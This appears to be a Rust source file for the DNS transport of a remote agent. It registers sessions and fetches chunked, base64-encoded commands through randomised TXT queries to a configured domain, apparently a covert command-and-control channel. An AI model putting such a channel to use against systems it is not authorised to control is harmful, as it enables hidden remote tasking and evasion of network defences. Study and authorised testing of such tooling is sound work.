use core::net::{SocketAddr};
use base64::Engine;

use hickory_resolver::{Resolver};
use hickory_resolver::config::{NameServerConfig, ResolverConfig, ResolverOpts, Protocol};
use hickory_resolver::lookup::TxtLookup;
use rand::Rng;

use base64::prelude::BASE64_STANDARD;

use crate::transport::{LastOne, Transport};
use crate::session::Session;
use crate::command::{CommandInfo, CommandDetails};

pub struct DNS {
    pub server: String,
    pub domain: String,

    session: Session,

    resolver: Resolver,
}

fn generate_blob(length: usize) -> String {
    rand::thread_rng()
        .sample_iter(&rand::distributions::Alphanumeric)
        .take(length)
        .map(char::from)
        .collect()
}

impl Transport for DNS {
    fn register_session(&self) -> Result<(), String> {
        let query = format!(
            "{}.{}.{}.{}",
            self.session.project_id,
            self.session.id,
            generate_blob(4),
            self.domain
        );

        return match self.resolver.ipv6_lookup(query) {
            Ok(_) => {
                Ok(())
            }
            Err(e) => {
                Err(format!("Failed to register session: {}", e))
            }
        }
    }

    fn command_info(&self) -> Result<Option<CommandInfo>, String> {
        let query = format!(
            "{}.{}.{}",
            self.session.id,
            generate_blob(4),
            self.domain,
        );

        let response = match self.resolver.txt_lookup(query) {
            Ok(resp) => dns_txt_to_string(resp),
            Err(e) => return Err(format!("Failed to lookup TXT records: {}", e)),
        };

        if response == "null" {
            return Ok(None);
        }

        match serde_json::from_str::<CommandInfo>(&response) {
            Ok(cmd_info) => Ok(Some(cmd_info)),
            Err(e) => {
                println!("Error deserializing the data: {}", e);
                Ok(None)
            }
        }
    }

    fn command_details(&self, command: &mut CommandInfo, offset: &mut u64) -> Result<LastOne, String> {
        let query = format!(
            "{}.{}.{}.{}.{}",
            generate_blob(1),
            offset,
            command.command_id,
            generate_blob(4),
            self.domain
        );

        let resp = self.resolver.txt_lookup(query)
            .map_err(|e| format!("Error querying cmd details: {}", e))?;

        let response = dns_txt_to_string(resp);

        let decoded_bytes = BASE64_STANDARD.decode(response)
            .map_err(|_| "Could not decode command chunk".to_string())?;

        let decoded_str = String::from_utf8(decoded_bytes)
            .unwrap_or_else(|_| "".to_string());

        let cmd_details = serde_json::from_str::<CommandDetails>(&decoded_str)
            .map_err(|e| format!("Error decoding cmd details {}", e))?;

        command.command += cmd_details.data.as_str();
        Ok(cmd_details.is_last_chunk)
    }
}

impl DNS {
    pub fn new(server: String, domain: String, session: Session) -> DNS {
        let resolver;
        if server == "" {
            resolver = Resolver::from_system_conf().unwrap()
        } else {
            match server.parse::<SocketAddr>() {
                Ok(socket) => {
                    let mut resolver_config = ResolverConfig::new();
                    resolver_config.add_name_server(NameServerConfig::new(socket, Protocol::Udp));
                    resolver_config.add_name_server(NameServerConfig::new(socket, Protocol::Tcp));

                    resolver = Resolver::new(resolver_config, ResolverOpts::default()).unwrap();
                }
                Err(_) => resolver = Resolver::from_system_conf().unwrap()
            }
        }

        DNS {
            server,
            domain,
            session,
            resolver,
        }
    }
}

fn dns_txt_to_string(input: TxtLookup) -> String {
    input.as_lookup().record_iter()
        .filter_map(|record| record.data()?.as_txt().map(|txt| txt.to_string()))
        .collect::<Vec<_>>()
        .join("") // Use join to convert Vec<String> to a single String
}